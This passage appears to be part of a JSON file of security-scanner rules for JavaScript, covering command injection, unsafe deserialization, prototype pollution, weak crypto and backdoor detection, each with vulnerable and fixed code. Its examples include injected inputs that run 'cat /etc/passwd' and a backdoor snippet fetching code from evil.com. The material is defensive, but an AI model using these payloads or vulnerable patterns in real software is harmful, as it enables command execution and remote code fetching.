    "help": "# Unsafe shell command constructed from library input\nDynamically constructing a shell command with inputs from exported functions may inadvertently change the meaning of the shell command. Clients using the exported function may use inputs containing characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.\n\n\n## Recommendation\nIf possible, provide the dynamic arguments to the shell as an array using a safe API such as `child_process.execFile` to avoid interpretation by the shell.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.\n\nAlternatively, if the command must be interpreted by a shell (for example because it includes I/O redirections), you can use `shell-quote` to escape any special characters in the input before embedding it in the command.\n\n\n## Example\nThe following example shows a dynamically constructed shell command that downloads a file from a remote URL.\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nmodule.exports = function download(path, callback) {\n  cp.exec(\"wget \" + path, callback);\n}\n\n```\nThe shell command will, however, fail to work as intended if the input contains spaces or other special characters interpreted in a special way by the shell.\n\nEven worse, a client might pass in user-controlled data, not knowing that the input is interpreted as a shell command. This could allow a malicious user to provide the input `http://example.org; cat /etc/passwd` in order to execute the command `cat /etc/passwd`.\n\nTo avoid such potentially catastrophic behaviors, provide the inputs from exported functions as an argument that does not get interpreted by a shell:\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nmodule.exports = function download(path, callback) {\n  cp.execFile(\"wget\", [path], callback);\n}\n\n```\nAs another example, consider the following code which is similar to the preceding example, but pipes the output of `wget` into `wc -l` to count the number of lines in the downloaded file.\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nmodule.exports = function download(path, callback) {\n  cp.exec(\"wget \" + path + \" | wc -l\", callback);\n};\n\n```\nIn this case, using `child_process.execFile` is not an option because the shell is needed to interpret the pipe operator. Instead, you can use `shell-quote` to escape the input before embedding it in the command:\n\n\n```javascript\nvar cp = require(\"child_process\");\n\nmodule.exports = function download(path, callback) {\n  cp.exec(\"wget \" + shellQuote.quote([path]) + \" | wc -l\", callback);\n};\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* npm: [shell-quote](https://www.npmjs.com/package/shell-quote).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "js/env-key-and-value-injection": {
    "name": "User controlled arbitrary environment variable injection",
    "description": "creating arbitrary environment variables from user controlled data is not secure",
    "kind": "path-problem",
    "id": "js/env-key-and-value-injection",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "medium",
    "tags": [
      "security",
      "external/cwe/cwe-089"
    ],
    "filename": "fce8af0a-EnvValueAndKeyInjection",
    "language": "javascript",
    "help": "# User controlled arbitrary environment variable injection\nControlling the value of arbitrary environment variables from user-controllable data is not safe.\n\n\n## Recommendation\nRestrict this operation only to privileged users or only for some not important environment variables.\n\n\n## Example\nThe following example allows unauthorized users to assign a value to any environment variable.\n\n\n```javascript\nconst http = require('node:http');\n\nhttp.createServer((req, res) => {\n  const { EnvValue, EnvKey } = req.body;\n  process.env[EnvKey] = EnvValue; // NOT OK\n\n  res.end('env has been injected!');\n});\n```\n\n## References\n* [Admin account TakeOver in mintplex-labs/anything-llm](https://huntr.com/bounties/00ec6847-125b-43e9-9658-d3cace1751d6/)\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "js/unsafe-deserialization": {
    "name": "Deserialization of user-controlled data",
    "description": "Deserializing user-controlled data may allow attackers to execute arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/unsafe-deserialization",
    "tags": [
      "security",
      "external/cwe/cwe-502"
    ],
    "filename": "acf8060f-UnsafeDeserialization",
    "language": "javascript",
    "help": "# Deserialization of user-controlled data\nDeserializing untrusted data using any deserialization framework that allows the construction of arbitrary functions is easily exploitable and, in many cases, allows an attacker to execute arbitrary code.\n\n\n## Recommendation\nAvoid deserialization of untrusted data if at all possible. If the architecture permits it, then use formats like JSON or XML that cannot represent functions. When using YAML or other formats that support the serialization and deserialization of functions, ensure that the parser is configured to disable deserialization of arbitrary functions.\n\n\n## Example\nThe following example calls the `load` function of the popular `js-yaml` package on data that comes from an HTTP request and hence is inherently unsafe.\n\n\n```javascript\nconst app = require(\"express\")(),\n  jsyaml = require(\"js-yaml\");\n\napp.get(\"load\", function(req, res) {\n  let data = jsyaml.load(req.params.data);\n  // ...\n});\n\n```\nUsing the `safeLoad` function instead (which does not deserialize YAML-encoded functions) removes the vulnerability.\n\n\n```javascript\nconst app = require(\"express\")(),\n  jsyaml = require(\"js-yaml\");\n\napp.get(\"load\", function(req, res) {\n  let data = jsyaml.safeLoad(req.params.data);\n  // ...\n});\n\n```\n\n## References\n* OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).\n* Neal Poole: [Code Execution via YAML in JS-YAML Node.js Module](https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/).\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "js/resource-exhaustion-from-deep-object-traversal": {
    "name": "Resources exhaustion from deep object traversal",
    "description": "Processing user-controlled object hierarchies inefficiently can lead to denial of service.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/resource-exhaustion-from-deep-object-traversal",
    "tags": [
      "security",
      "external/cwe/cwe-400"
    ],
    "filename": "beefb534-DeepObjectResourceExhaustion",
    "language": "javascript",
    "help": "# Resources exhaustion from deep object traversal\nProcessing user-controlled data with a method that allocates excessive amounts of memory can lead to denial of service.\n\nIf the JSON schema validation library `ajv` is configured with `allErrors: true` there is no limit to how many error objects will be allocated. An attacker can exploit this by sending an object that deliberately contains a huge number of errors, and in some cases, with longer and longer error messages. This can cause the service to become unresponsive due to the slow error-checking process.\n\n\n## Recommendation\nDo not use `allErrors: true` in production.\n\n\n## Example\nIn the example below, the user-submitted object `req.body` is validated using `ajv` and `allErrors: true`:\n\n\n```javascript\nimport express from 'express';\nimport Ajv from 'ajv';\n\nlet ajv = new Ajv({ allErrors: true });\najv.addSchema(require('./input-schema'), 'input');\n\nvar app = express();\napp.get('/user/:id', function(req, res) {\n\tif (!ajv.validate('input', req.body)) {\n\t\tres.end(ajv.errorsText());\n\t\treturn;\n\t}\n\t// ...\n});\n\n```\nAlthough this ensures that `req.body` conforms to the schema, the validation itself could be vulnerable to a denial-of-service attack. An attacker could send an object containing so many errors that the server runs out of memory.\n\nA solution is to not pass in `allErrors: true`, which means `ajv` will only report the first error, not all of them:\n\n\n```javascript\nimport express from 'express';\nimport Ajv from 'ajv';\n\nlet ajv = new Ajv({ allErrors: process.env['REST_DEBUG'] });\najv.addSchema(require('./input-schema'), 'input');\n\nvar app = express();\napp.get('/user/:id', function(req, res) {\n\tif (!ajv.validate('input', req.body)) {\n\t\tres.end(ajv.errorsText());\n\t\treturn;\n\t}\n\t// ...\n});\n\n```\n\n## References\n* Ajv documentation: [security considerations](https://github.com/ajv-validator/ajv/blob/master/docs/security.md#untrusted-schemas)\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/unsafe-dynamic-method-access": {
    "name": "Unsafe dynamic method access",
    "description": "Invoking user-controlled methods on certain objects can lead to remote code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "js/unsafe-dynamic-method-access",
    "tags": [
      "security",
      "external/cwe/cwe-094"
    ],
    "filename": "a2d22db7-UnsafeDynamicMethodAccess",
    "language": "javascript",
    "help": "# Unsafe dynamic method access\nCalling a user-controlled method on certain objects can lead to invocation of unsafe functions, such as `eval` or the `Function` constructor. In particular, the global object contains the `eval` function, and any function object contains the `Function` constructor in its `constructor` property.\n\n\n## Recommendation\nAvoid invoking user-controlled methods on the global object or on any function object. Whitelist the permitted method names or change the type of object the methods are stored on.\n\n\n## Example\nIn the following example, a message from the document's parent frame can invoke the `play` or `pause` method. However, it can also invoke `eval`. A malicious website could embed the page in an iframe and execute arbitrary code by sending a message with the name `eval`.\n\n\n```javascript\n// API methods\nfunction play(data) {\n  // ...\n}\nfunction pause(data) {\n  // ...\n}\n\nwindow.addEventListener(\"message\", (ev) => {\n    let message = JSON.parse(ev.data);\n\n    // Let the parent frame call the 'play' or 'pause' function \n    window[message.name](message.payload);\n});\n\n```\nInstead of storing the API methods in the global scope, put them in an API object or Map. It is also good practice to prevent invocation of inherited methods like `toString` and `valueOf`.\n\n\n```javascript\n// API methods\nlet api = {\n  play: function(data) {\n    // ...\n  },\n  pause: function(data) {\n    // ...\n  }\n};\n\nwindow.addEventListener(\"message\", (ev) => {\n    let message = JSON.parse(ev.data);\n\n    // Let the parent frame call the 'play' or 'pause' function\n    if (!api.hasOwnProperty(message.name)) {\n      return;\n    }\n    api[message.name](message.payload);\n});\n\n```\n\n## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n* MDN: [Global functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects#Function_properties).\n* MDN: [Function constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "js/client-side-request-forgery": {
    "name": "Client-side request forgery",
    "description": "Making a client-to-server request with user-controlled data in the URL allows a request forgery attack against the client.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 5.0,
    "precision": "medium",
    "id": "js/client-side-request-forgery",
    "tags": [
      "security",
      "external/cwe/cwe-918"
    ],
    "filename": "cd6c747e-ClientSideRequestForgery",
    "language": "javascript",
    "help": "# Client-side request forgery\nDirectly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. A client-side forged request may perform an unwanted action affecting the victim's account, or may lead to cross-site scripting if the request response is handled in an unsafe way. This is different from CSRF (cross-site request forgery), and will usually bypass CSRF protections. This is usually less severe than SSRF (server-side request forgery), as it does not expose internal services.\n\n\n## Recommendation\nRestrict user inputs in the URL of an outgoing request, in particular:\n\n* Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.\n* Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal (\"`../`\") cannot be used to redirect the request to an unintended endpoint.\n\n## Example\nThe following example shows an HTTP request used to fetch the pre-rendered HTML body of a message. It is using the endpoint `/api/messages/ID`, which is believed to respond with a safe HTML string, to be embedded in the page:\n\n\n```javascript\nasync function loadMessage() {\n    const query = new URLSearchParams(location.search);\n    const url = '/api/messages/' + query.get('message_id');\n    const data = await (await fetch(url)).json();\n    document.getElementById('message').innerHTML = data.html;\n}\n\n```\nHowever, the format of the message ID is not checked, and an attacker can abuse this to alter the endpoint targeted by the request. If they can redirect it to an endpoint that returns an untrusted value, this leads to cross-site scripting.\n\nFor example, given the query string `message_id=../pastebin/123`, the request will end up targeting the `/api/pastebin` endpoint. Or if there is an open redirect on the login page, a query string like `message_id=../../login?redirect_url=https://evil.com` could give the attacker full control over the response as well.\n\nIn example below, the input has been restricted to a number so that the endpoint cannot be altered:\n\n\n```javascript\nasync function loadMessage() {\n    const query = new URLSearchParams(location.search);\n    const url = '/api/messages/' + Number(query.get('message_id'));\n    const data = await (await fetch(url)).json();\n    document.getElementById('message').innerHTML = data.html;\n}\n\n```\n\n## References\n* OWASP: [Server-side request forgery](https://cwe.mitre.org/data/definitions/918.html)\n* OWASP: [Cross-site request forgery](https://cwe.mitre.org/data/definitions/352.html)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n"
  },
  "js/insecure-dependency": {
    "name": "Dependency download using unencrypted communication channel",
    "description": "Using unencrypted protocols to fetch dependencies can leave an application open to man-in-the-middle attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "high",
    "id": "js/insecure-dependency",
    "tags": [
      "security",
      "external/cwe/cwe-300",
      "external/cwe/cwe-319",
      "external/cwe/cwe-494",
      "external/cwe/cwe-829"
    ],
    "filename": "8654efff-InsecureDependencyResolution",
    "language": "javascript",
    "help": "# Dependency download using unencrypted communication channel\nUsing an insecure protocol like HTTP or FTP to download build dependencies makes the build process vulnerable to a man-in-the-middle (MITM) attack.\n\nThis can allow attackers to inject malicious code into the downloaded dependencies, and thereby infect the build artifacts and execute arbitrary code on the machine building the artifacts.\n\n\n## Recommendation\nAlways use a secure protocol, such as HTTPS or SFTP, when downloading artifacts from an URL.\n\n\n## Example\nThe below example shows a `package.json` file that downloads a dependency using the insecure HTTP protocol.\n\n\n```json\n{\n  \"name\": \"example-project\",\n  \"dependencies\": {\n    \"unencrypted\": \"http://example.org/foo/tarball/release/0.0.1\",\n    \"lodash\": \"^4.0.0\"\n  }\n}\n```\nThe fix is to change the protocol to HTTPS.\n\n\n```json\n{\n  \"name\": \"example-project\",\n  \"dependencies\": {\n    \"unencrypted\": \"https://example.org/foo/tarball/release/0.0.1\",\n    \"lodash\": \"^4.0.0\"\n  }\n}\n```\n\n## References\n* Jonathan Leitschuh: [ Want to take over the Java ecosystem? All you need is a MITM! ](https://infosecwriteups.com/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb)\n* Max Veytsman: [ How to take over the computer of any Java (or Closure or Scala) Developer. ](https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/)\n* Wikipedia: [Supply chain attack.](https://en.wikipedia.org/wiki/Supply_chain_attack)\n* Wikipedia: [Man-in-the-middle attack.](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)\n* Common Weakness Enumeration: [CWE-300](https://cwe.mitre.org/data/definitions/300.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n* Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).\n* Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).\n"
  },
  "js/unsafe-deserialization-more-sources": {
    "name": "Deserialization of user-controlled data with additional heuristic sources",
    "description": "Deserializing user-controlled data may allow attackers to execute arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/unsafe-deserialization-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-502"
    ],
    "filename": "b4cef3e4-UnsafeDeserialization",
    "language": "javascript",
    "help": "# Deserialization of user-controlled data with additional heuristic sources\nDeserializing untrusted data using any deserialization framework that allows the construction of arbitrary functions is easily exploitable and, in many cases, allows an attacker to execute arbitrary code.\n\n\n## Recommendation\nAvoid deserialization of untrusted data if at all possible. If the architecture permits it, then use formats like JSON or XML that cannot represent functions. When using YAML or other formats that support the serialization and deserialization of functions, ensure that the parser is configured to disable deserialization of arbitrary functions.\n\n\n## Example\nThe following example calls the `load` function of the popular `js-yaml` package on data that comes from an HTTP request and hence is inherently unsafe.\n\n\n```javascript\nconst app = require(\"express\")(),\n  jsyaml = require(\"js-yaml\");\n\napp.get(\"load\", function(req, res) {\n  let data = jsyaml.load(req.params.data);\n  // ...\n});\n\n```\nUsing the `safeLoad` function instead (which does not deserialize YAML-encoded functions) removes the vulnerability.\n\n\n```javascript\nconst app = require(\"express\")(),\n  jsyaml = require(\"js-yaml\");\n\napp.get(\"load\", function(req, res) {\n  let data = jsyaml.safeLoad(req.params.data);\n  // ...\n});\n\n```\n\n## References\n* OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).\n* Neal Poole: [Code Execution via YAML in JS-YAML Node.js Module](https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/).\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "js/shell-command-injection-from-environment": {
    "name": "Shell command built from environment values",
    "description": "Building a shell command string with values from the enclosing environment may cause subtle bugs or vulnerabilities.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.3,
    "precision": "high",
    "id": "js/shell-command-injection-from-environment",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "5ab6110a-ShellCommandInjectionFromEnvironment",
    "language": "javascript",
    "help": "# Shell command built from environment values\nDynamically constructing a shell command with values from the local environment, such as file paths, may inadvertently change the meaning of the shell command. Such changes can occur when an environment value contains characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the shell command to run, and provide the dynamic arguments to the shell command separately to avoid interpretation by the shell.\n\nAlternatively, if the shell command must be constructed dynamically, then add code to ensure that special characters in environment values do not alter the shell command unexpectedly.\n\n\n## Example\nThe following example shows a dynamically constructed shell command that recursively removes a temporary directory that is located next to the currently executing JavaScript file. Such utilities are often found in custom build scripts.\n\n\n```javascript\nvar cp = require(\"child_process\"),\n  path = require(\"path\");\nfunction cleanupTemp() {\n  let cmd = \"rm -rf \" + path.join(__dirname, \"temp\");\n  cp.execSync(cmd); // BAD\n}\n\n```\nThe shell command will, however, fail to work as intended if the absolute path of the script's directory contains spaces. In that case, the shell command will interpret the absolute path as multiple paths, instead of a single path.\n\nFor instance, if the absolute path of the temporary directory is `/home/username/important project/temp`, then the shell command will recursively delete `/home/username/important` and `project/temp`, where the latter path gets resolved relative to the working directory of the JavaScript process.\n\nEven worse, although less likely, a malicious user could provide the path `/home/username/; cat /etc/passwd #/important project/temp` in order to execute the command `cat /etc/passwd`.\n\nTo avoid such potentially catastrophic behaviors, provide the directory as an argument that does not get interpreted by a shell:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n  path = require(\"path\");\nfunction cleanupTemp() {\n  let cmd = \"rm\",\n    args = [\"-rf\", path.join(__dirname, \"temp\")];\n  cp.execFileSync(cmd, args); // GOOD\n}\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "js/remote-property-injection-more-sources": {
    "name": "Remote property injection with additional heuristic sources",
    "description": "Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "js/remote-property-injection-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-250",
      "external/cwe/cwe-400"
    ],
    "filename": "e30d47d7-RemotePropertyInjection",
    "language": "javascript",
    "help": "# Remote property injection with additional heuristic sources\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/weak-cryptographic-algorithm": {
    "name": "Use of a broken or weak cryptographic algorithm",
    "description": "Using broken or weak cryptographic algorithms can compromise security.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/weak-cryptographic-algorithm",
    "tags": [
      "security",
      "external/cwe/cwe-327",
      "external/cwe/cwe-328"
    ],
    "filename": "81ce0e92-BrokenCryptoAlgorithm",
    "language": "javascript",
    "help": "# Use of a broken or weak cryptographic algorithm\nUsing broken or weak cryptographic algorithms can leave data vulnerable to being decrypted or forged by an attacker.\n\nMany cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that encrypted or hashed data is less secure than it appears to be.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic algorithm. Use at least AES-128 or RSA-2048 for encryption, and SHA-2 or SHA-3 for secure hashing.\n\n\n## Example\nThe following code shows an example of using the builtin cryptographic library of NodeJS to encrypt some secret data. When creating a `Cipher` instance to encrypt the secret data with, you must specify the encryption algorithm to use. The first example uses DES, which is an older algorithm that is now considered weak. The second example uses AES, which is a strong modern algorithm.\n\n\n```javascript\nconst crypto = require('crypto');\n\nvar secretText = obj.getSecretText();\n\nconst desCipher = crypto.createCipher('des', key);\nlet desEncrypted = desCipher.write(secretText, 'utf8', 'hex'); // BAD: weak encryption\n\nconst aesCipher = crypto.createCipher('aes-128', key);\nlet aesEncrypted = aesCipher.update(secretText, 'utf8', 'hex'); // GOOD: strong encryption\n\n```\n\n## References\n* NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).\n* NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n* Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).\n"
  },
  "js/build-artifact-leak": {
    "name": "Storage of sensitive information in build artifact",
    "description": "Including sensitive information in a build artifact can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/build-artifact-leak",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-315",
      "external/cwe/cwe-359"
    ],
    "filename": "1b3d24d7-BuildArtifactLeak",
    "language": "javascript",
    "help": "# Storage of sensitive information in build artifact\nSensitive information included in a build artifact can allow an attacker to access the sensitive information if the artifact is published.\n\n\n## Recommendation\nOnly store information that is meant to be publicly available in a build artifact.\n\n\n## Example\nThe following example creates a `webpack` configuration that inserts all environment variables from the host into the build artifact:\n\n\n```javascript\nconst webpack = require(\"webpack\");\n\nmodule.exports = [{\n    plugins: [\n        new webpack.DefinePlugin({\n            \"process.env\": JSON.stringify(process.env)\n        })\n    ]\n}];\n```\nThe environment variables might include API keys or other sensitive information, and the build-system should instead insert only the environment variables that are supposed to be public.\n\nThe issue has been fixed below, where only the `DEBUG` environment variable is inserted into the artifact.\n\n\n```javascript\nconst webpack = require(\"webpack\");\n\nmodule.exports = [{\n    plugins: [\n        new webpack.DefinePlugin({\n            'process.env': JSON.stringify({ DEBUG: process.env.DEBUG })\n        })\n    ]\n}];\n\n```\n\n## References\n* webpack: [DefinePlugin API](https://webpack.js.org/plugins/define-plugin/).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n"
  },
  "js/hardcoded-data-interpreted-as-code": {
    "name": "Hard-coded data interpreted as code",
    "description": "Transforming hard-coded data (such as hexadecimal constants) into code to be executed is a technique often associated with backdoors and should be avoided.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "medium",
    "id": "js/hardcoded-data-interpreted-as-code",
    "tags": [
      "security",
      "external/cwe/cwe-506"
    ],
    "filename": "dfa9620b-HardcodedDataInterpretedAsCode",
    "language": "javascript",
    "help": "# Hard-coded data interpreted as code\nInterpreting hard-coded data, such as string literals containing hexadecimal numbers, as code or as an import path is typical of malicious backdoor code that has been implanted into an otherwise trusted code base and is trying to hide its true purpose from casual readers or automated scanning tools.\n\n\n## Recommendation\nExamine the code in question carefully to ascertain its provenance and its true purpose. If the code is benign, it should always be possible to rewrite it without relying on dynamically interpreting data as code, improving both clarity and safety.\n\n\n## Example\nAs an example of malicious code using this obfuscation technique, consider the following simplified version of a snippet of backdoor code that was discovered in a dependency of the popular `event-stream` npm package:\n\n\n```javascript\nvar r = require;\n\nfunction e(r) {\n  return Buffer.from(r, \"hex\").toString()\n}\n\n// BAD: hexadecimal constant decoded and interpreted as import path\nvar n = r(e(\"2e2f746573742f64617461\"));\n\n```\nWhile this shows only the first few lines of code, it already looks very suspicious since it takes a hard-coded string literal, hex-decodes it and then uses it as an import path. The only reason to do so is to hide the name of the file being imported.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* The npm Blog: [Details about the event-stream incident](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident).\n* Common Weakness Enumeration: [CWE-506](https://cwe.mitre.org/data/definitions/506.html).\n"
  },
  "js/http-to-file-access": {
    "name": "Network data written to file",
    "description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.3,
    "precision": "medium",
    "id": "js/http-to-file-access",
    "tags": [
      "security",
      "external/cwe/cwe-912",
      "external/cwe/cwe-434"
    ],
    "filename": "70a813bd-HttpToFileAccess",
    "language": "javascript",
    "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n"
  },
  "js/log-injection": {
    "name": "Log injection",
    "description": "Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "medium",
    "id": "js/log-injection",
    "tags": [
      "security",
      "external/cwe/cwe-117"
    ],
    "filename": "ae32afb5-LogInjection",
    "language": "javascript",
